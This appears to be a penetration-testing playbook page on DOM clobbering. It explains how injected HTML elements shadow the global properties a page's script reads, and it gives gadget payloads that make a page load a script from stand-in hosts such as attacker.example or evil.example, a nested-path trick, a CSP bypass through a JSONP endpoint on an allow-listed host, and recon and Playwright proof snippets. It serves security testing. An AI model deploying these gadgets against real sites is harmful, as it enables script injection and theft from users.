# DOM Clobbering — Break JS Logic by Shadowing Global Properties

Read this when you have an **HTML-injection foothold** (reflected/stored, even where full
XSS is blocked by CSP or a sanitizer) and the page's own script reads global object
properties that your injected elements can **clobber**. Clobbering turns a "safe" HTML
injection into script execution, CSP bypass, or logic abuse — without ever writing `<script>`.

This is the companion to `/xss` Chain 9. It reuses the live `window.__xss` instrumentation
from [`playwright-dom-debugging.md`](playwright-dom-debugging.md) for proofs and ends "back
to `curl`" with the PoC.

## Mechanics — named elements *become* global properties

The browser exposes any element with an `id` (and some with a `name`) as a property on
`window` / `document`. Inject an element whose `id`/`name` collides with a global the app's
script trusts, and your element shadows it.

```html
<!-- you inject this through an HTML-injection sink the sanitizer/CSP still allows -->
<a id="config" href="https://attacker.example/malicious.js"></a>
```

```js
// the app's own bundle, later:
let apiBase = window.config?.apiBase || "/api/v1/user";   // window.config is now your <a>
let s = document.createElement("script");
s.src = String(apiBase) + "/profile.js";                   // apiBase is undefined...
document.body.appendChild(s);
```

The crucial quirk: an `<a>`/`<area>` element exposes its **`href` as the string value of the
property**. So `window.config` returns the `<a>` element, and properties that don't exist on
the element fall through to nothing — **unless** you also set the matching attribute. That's
why the classic gadget uses `name=` for the second hop:

```html
<a id="config" name="apiBase" href="https://attacker.example/malicious.js"></a>
```

Now `window.config.apiBase` returns the element's `href` — fully attacker-controlled — and
the script tag loads from your host. (Some gadgets need the property to be an attribute the
element actually has; `<a>`'s `href`/`name`/`target` are the workhorses.)

## Clobbering a nested path (`window.x.y`) — HTMLCollection trick

A single element only gives you `window.x`. For a two-deep read like `window.x.y`, inject
**two** elements sharing the same `id`; the browser turns them into an `HTMLCollection`, and
`name`d children become reachable as properties of the collection:

```html
<a id="x" name="y" href="javascript:alert(1)"></a>
<a id="x"></a>
```

`window.x.y` now resolves to the first `<a>`'s `href`. Three-deep paths (`window.x.y.z`)
need `name` + an inner element (e.g. `<form>` + `<input>`) and are browser/version-sensitive —
test the exact path the app reads.

## Canonical gadgets

| Target pattern in app JS | Inject | Effect |
|---|---|---|
| `window.config?.apiBase` → script/src | `<a id="config" name="apiBase" href="//evil/x.js">` | load attacker script |
| `window.analyticsConfig?.loadCallback` | `<a id="analyticsConfig" name="loadCallback" href="...&callback=print">` | CSP-bypass JSONP (below) |
| AngularJS `$element.data('attrs')` / attribute lookups | `<form id="test"><input id="attributes">` | classic AngularJS clobber (also in `/bxss`) |
| any `window.SOMETHING` read before a `||` fallback | `<img id="SOMETHING" src=x>` | flip a `||`-default branch (logic abuse) |

> **Always read the exact property path the bundle accesses first.** Clobbering is precise:
> you mirror *their* `window.X.Y[.Z]` with `id`/`name` that resolve to the same shape.
> Guessing wastes the foothold.

## Chain: bypass a strict CSP via DOM Clobbering

The crown jewel — turn HTML injection into execution under a CSP that blocks inline scripts.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.example;
```

The page loads a legit analytics script and lets a global configure its callback:

```js
let cb = window.analyticsConfig?.loadCallback || "/js/empty.js";
let s = document.createElement("script");
s.src = "https://trusted-cdn.example/js/lib.js?cb=" + encodeURIComponent(cb);
document.body.appendChild(s);
```

Inject (through the HTML-injection foothold — a comment, rich-text field, page param):

```html
<a id="analyticsConfig" name="loadCallback" href="x&callback=print"></a>
```

The script tag now fetches `https://trusted-cdn.example/js/lib.js?cb=x&callback=print`. If
that CDN endpoint is a **JSONP-style** responder (or any endpoint on an allow-listed origin
that echoes a parameter into executable JS), the code runs **inside the CSP-allowed origin** —
a complete CSP bypass. The win is routing execution through a trusted host the CSP already
permits, not defeating CSP directly.

> So when you see `script-src 'self' <allow-list>`, also inventory every endpoint on those
> allow-listed hosts for JSONP / reflection that a clobber-controlled query can steer.

## Detection

You need (a) an **HTML-injection foothold** and (b) app code that **reads a global you can
shadow**. Recon gives you both halves:

```bash
# (a) the injection sink — /xss Step 1-3 or /recon step I
# (b) global-property reads in the bundle that a named element could shadow
ugrep -aonE "window\.[A-Za-z_$][\w$]*(\??\.[A-Za-z_$][\w$]*){0,2}" js/ | sort -u
```

Then eyeball the reads for the clobber-friendly shape: a `window.X` or `window.X.Y` used as
a URL / script `src` / callback / config, ideally gated by `?.` or a `|| "fallback"` default.
Cross-reference with the HTML-injection sink you already have — same page, same render.

## Proof (headless Playwright)

Reuse the sink hook from [`playwright-dom-debugging.md`](playwright-dom-debugging.md) §1, then
inject the gadget and confirm the script `src` flips to your host:

```js
() => {
  // 1. plant the clobber gadget (stand-in for your HTML-injection foothold)
  document.body.insertAdjacentHTML('beforeend',
    '<a id="config" name="apiBase" href="https://evil.example/x.js"></a>');
  // 2. confirm window.config.apiBase now resolves to your href
  return {
    config: !!window.config,
    apiBase: window.config && window.config.apiBase && String(window.config.apiBase)
  };
}
```

`apiBase` returning `https://evil.example/x.js` = the clobber works. To prove *execution*,
point the `href` at a script that does a visible effect (a `fetch` to your HTTPWorkbench
instance, or sets `document.title`), install the sink hook, trigger the app's loader, and
read `window.__xss.sinks` / screenshot the effect — same "prove with a visible DOM effect,
not `alert()`" rule as the rest of `/xss`.

## Cross-links

- Foothold: `/xss` Steps 1–3 (reflected) or `/bxss` (blind/admin render). The AngularJS
  `<form id=test><input id=attributes>` gadget already noted in `/bxss` lives here too.
- Live instrumentation: [`playwright-dom-debugging.md`](playwright-dom-debugging.md) §1 (sink
  hook) + §4 (CSP-violation capture — a `script-src` violation that fires *after* the clobber
  proves the injection reached a script loader).
- Filter/CSP context: `/waf-bypass` (CSP-allow-list → JSONP pivot is its kind of chain).
